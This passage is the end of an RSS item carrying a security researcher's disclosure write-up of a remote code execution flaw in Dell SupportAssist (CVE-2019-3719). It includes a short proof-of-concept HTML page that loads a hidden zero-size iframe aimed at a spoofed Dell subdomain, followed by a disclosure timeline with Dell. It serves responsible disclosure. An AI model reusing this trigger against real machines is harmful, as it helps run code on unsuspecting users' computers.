&lt;/ol&gt;&lt;p&gt;You can read Dell’s advisory &lt;a href=&quot;https://www.dell.com/support/article/us/en/19/sln316857/dsa-2019-051-dell-supportassist-client-multiple-vulnerabilities&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Here’s a small demo video showcasing the vulnerability. You can download the source code of the proof of concept &lt;a href=&quot;https://github.com/D4stiny/Dell-Support-Assist-RCE-PoC&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/0cTfnZ04jgQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;
&lt;p&gt;The source code of the dellrce.html file featured in the video is:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;CVE-2019-3719&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Nothing suspicious here... move along...&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.dellrce.dell.com&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width: 0; height: 0; border: 0; border: none; position: absolute;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;10/26/2018 - Initial write up sent to Dell.&lt;/p&gt;
&lt;p&gt;10/29/2018 - Initial response from Dell.&lt;/p&gt;
&lt;p&gt;11/22/2018 - Dell has confirmed the vulnerability.&lt;/p&gt;
&lt;p&gt;11/29/2018 - Dell scheduled a “tentative” fix to be released in Q1 2019.&lt;/p&gt;
&lt;p&gt;01/28/2019 - Disclosure date extended to March.&lt;/p&gt;
&lt;p&gt;03/13/2019 - Dell is still fixing the vulnerability and has scheduled disclosure for the end of April.&lt;/p&gt;
&lt;p&gt;04/18/2019 - Vulnerability disclosed as an &lt;a href=&quot;https://www.dell.com/support/article/us/en/19/sln316857/dsa-2019-051-dell-supportassist-client-multiple-vulnerabilities&quot;&gt;advisory&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Wed, 01 May 2019 17:24:46 +0000</pubDate>
<dc:creator>evanwalsh</dc:creator>
<og:description>What computer do you use? Who made it? Have you ever thought about what came with your computer? When we think of Remote Code Execution (RCE) vulnerabilities in mass, we might think of vulnerabilities in the operating system, but another attack vector to consider is “What third-party software came with my PC?”. In this article, I’ll be looking at a Remote Code Execution vulnerability I found in Dell SupportAssist, software meant to “proactively check the health of your system’s hardware and software” and which is “preinstalled on most of all new Dell devices”.</og:description>
<og:title>Remote Code Execution on most Dell computers</og:title>
<dc:format>text/html</dc:format>
<dc:identifier>https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/</dc:identifier>
</item>
</channel>
</rss>